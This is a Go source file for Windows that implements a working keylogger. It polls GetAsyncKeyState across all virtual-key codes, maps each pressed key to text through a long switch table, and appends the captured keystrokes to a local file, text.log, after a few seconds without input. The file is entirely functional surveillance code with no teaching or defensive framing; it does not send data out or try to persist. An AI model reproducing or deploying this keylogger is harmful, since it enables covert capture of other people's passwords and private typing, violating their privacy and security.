package main

import (
    //"io"
    //"io/ioutil"
    //"errors"
    //"fmt"
    "os"
    "log"
    "time"
    "golang.org/x/sys/windows"
    "github.com/TheTitanrain/w32"
)

var (
    user32               = windows.NewLazyDLL("user32.dll")
    procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")

    quit        = make(chan bool)
    timeout int = 0
    text    string
)

/**
 * Default time out
 *
 * @type int
 */
const DEFAULT_TIMEOUT = 4
/**
 * File name where to log text
 *
 * @type string
 */
const LOG_FILE = "text.log"

/**
 * Timeout interval
 *
 * @return void
 */
func interval() (err error) {

    // Do nothing..
    if timeout != 0 {
        return
    }

    // Start executing the loop
    for timeout < DEFAULT_TIMEOUT {

        // Log text and reset text to empty string
        if timeout == (DEFAULT_TIMEOUT -1) {

            // Log text
            logText(text)

            // Reset to empty
            text = ""

        }

        time.Sleep(1 * time.Second)
        timeout++

    }

    return

}

/**
 * KeyLog takes a readWriter and writes the logged characters.
 *
 * @return error
 */
func key() (err error) {

    // Query key mapped to integer `0x00` to `0xFF` if it's pressed.
    for i := 0; i < 0xFF; i++ {
        asynch, _, _ := procGetAsyncKeyState.Call(uintptr(i))

        // Ignore the least significant bit
        if asynch&0x1 == 0 {
            continue
        }

        // Update append text value
        text += value(i)

        // Reset timeout
        timeout = 0

    }

    time.Sleep(1 * time.Microsecond)
    return //errors.New("error message")
}

/**
 * Log text to file
 *
 * @param  text string
 * @return void
 */
func logText(text string) {

    f, err := os.OpenFile(LOG_FILE, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        log.Println(err)
    }

    defer f.Close()

    logger := log.New(f, "log: ", log.LstdFlags)
    logger.Println(text)

}

/**
 * Abstract infinite loop
 *
 * @param  f func() error
 * @return void
 */
func infinite(f func() error) {
    for {
        if err := f(); err != nil {
            quit<-true
        }
    }
}

/**
 * Main wrapper
 *
 * @return void
 */
func main() {

    go infinite(interval)
    go infinite(key)

    for {
        select {
        case <-quit:
            os.Exit(0)
        }
    }

}


/**
 * Determines the char value
 *
 * @param  k int
 * @return string
 */
func value(k int) (string) {
    key := ""
    switch k {
        case w32.VK_CONTROL:
            key = "[Ctrl]"
        case w32.VK_BACK:
            key = "[Back]"
        case w32.VK_TAB:
            key = "[Tab]"
        case w32.VK_RETURN:
            key = "[Enter]\r\n"
        case w32.VK_SHIFT:
            key = "[Shift]"
        case w32.VK_MENU:
            key = "[Alt]"
        case w32.VK_CAPITAL:
            key = "[CapsLock]"
        case w32.VK_ESCAPE:
            key = "[Esc]"
        case w32.VK_SPACE:
            key = " "
        case w32.VK_PRIOR:
            key = "[PageUp]"
        case w32.VK_NEXT:
            key = "[PageDown]"
        case w32.VK_END:
            key = "[End]"
        case w32.VK_HOME:
            key = "[Home]"
        case w32.VK_LEFT:
            key = "[Left]"
        case w32.VK_UP:
            key = "[Up]"
        case w32.VK_RIGHT:
            key = "[Right]"
        case w32.VK_DOWN:
            key = "[Down]"
        case w32.VK_SELECT:
            key = "[Select]"
        case w32.VK_PRINT:
            key = "[Print]"
        case w32.VK_EXECUTE:
            key = "[Execute]"
        case w32.VK_SNAPSHOT:
            key = "[PrintScreen]"
        case w32.VK_INSERT:
            key = "[Insert]"
        case w32.VK_DELETE:
            key = "[Delete]"
        case w32.VK_HELP:
            key = "[Help]"
        case w32.VK_LWIN:
            key = "[LeftWindows]"
        case w32.VK_RWIN:
            key = "[RightWindows]"
        case w32.VK_APPS:
            key = "[Applications]"
        case w32.VK_SLEEP:
            key = "[Sleep]"
        case w32.VK_NUMPAD0:
            key = "[Pad 0]"
        case w32.VK_NUMPAD1:
            key = "[Pad 1]"
        case w32.VK_NUMPAD2:
            key = "[Pad 2]"
        case w32.VK_NUMPAD3:
            key = "[Pad 3]"
        case w32.VK_NUMPAD4:
            key = "[Pad 4]"
        case w32.VK_NUMPAD5:
            key = "[Pad 5]"
        case w32.VK_NUMPAD6:
            key = "[Pad 6]"
        case w32.VK_NUMPAD7:
            key = "[Pad 7]"
        case w32.VK_NUMPAD8:
            key = "[Pad 8]"
        case w32.VK_NUMPAD9:
            key = "[Pad 9]"
        case w32.VK_MULTIPLY:
            key = "*"
        case w32.VK_ADD:
            key = "+"
        case w32.VK_SEPARATOR:
            key = "[Separator]"
        case w32.VK_SUBTRACT:
            key = "-"
        case w32.VK_DECIMAL:
            key = "."
        case w32.VK_DIVIDE:
            key = "[Divide]"
        case w32.VK_F1:
            key = "[F1]"
        case w32.VK_F2:
            key = "[F2]"
        case w32.VK_F3:
            key = "[F3]"
        case w32.VK_F4:
            key = "[F4]"
        case w32.VK_F5:
            key = "[F5]"
        case w32.VK_F6:
            key = "[F6]"
        case w32.VK_F7:
            key = "[F7]"
        case w32.VK_F8:
            key = "[F8]"
        case w32.VK_F9:
            key = "[F9]"
        case w32.VK_F10:
            key = "[F10]"
        case w32.VK_F11:
            key = "[F11]"
        case w32.VK_F12:
            key = "[F12]"
        case w32.VK_NUMLOCK:
            key = "[NumLock]"
        case w32.VK_SCROLL:
            key = "[ScrollLock]"
        case w32.VK_LSHIFT:
            key = "[LeftShift]"
        case w32.VK_RSHIFT:
            key = "[RightShift]"
        case w32.VK_LCONTROL:
            key = "[LeftCtrl]"
        case w32.VK_RCONTROL:
            key = "[RightCtrl]"
        case w32.VK_LMENU:
            key = "[LeftMenu]"
        case w32.VK_RMENU:
            key = "[RightMenu]"
        case w32.VK_OEM_1:
            key = ";"
        case w32.VK_OEM_2:
            key = "/"
        case w32.VK_OEM_3:
            key = "`"
        case w32.VK_OEM_4:
            key = "["
        case w32.VK_OEM_5:
            key = "\\"
        case w32.VK_OEM_6:
            key = "]"
        case w32.VK_OEM_7:
            key = "'"
        case w32.VK_OEM_PERIOD:
            key = "."
        case 0x30:
            key = "0"
        case 0x31:
            key = "1"
        case 0x32:
            key = "2"
        case 0x33:
            key = "3"
        case 0x34:
            key = "4"
        case 0x35:
            key = "5"
        case 0x36:
            key = "6"
        case 0x37:
            key = "7"
        case 0x38:
            key = "8"
        case 0x39:
            key = "9"
        case 0x41:
            key = "a"
        case 0x42:
            key = "b"
        case 0x43:
            key = "c"
        case 0x44:
            key = "d"
        case 0x45:
            key = "e"
        case 0x46:
            key = "f"
        case 0x47:
            key = "g"
        case 0x48:
            key = "h"
        case 0x49:
            key = "i"
        case 0x4A:
            key = "j"
        case 0x4B:
            key = "k"
        case 0x4C:
            key = "l"
        case 0x4D:
            key = "m"
        case 0x4E:
            key = "n"
        case 0x4F:
            key = "o"
        case 0x50:
            key = "p"
        case 0x51:
            key = "q"
        case 0x52:
            key = "r"
        case 0x53:
            key = "s"
        case 0x54:
            key = "t"
        case 0x55:
            key = "u"
        case 0x56:
            key = "v"
        case 0x57:
            key = "w"
        case 0x58:
            key = "x"
        case 0x59:
            key = "y"
        case 0x5A:
            key = "z"
    }

    return key
}
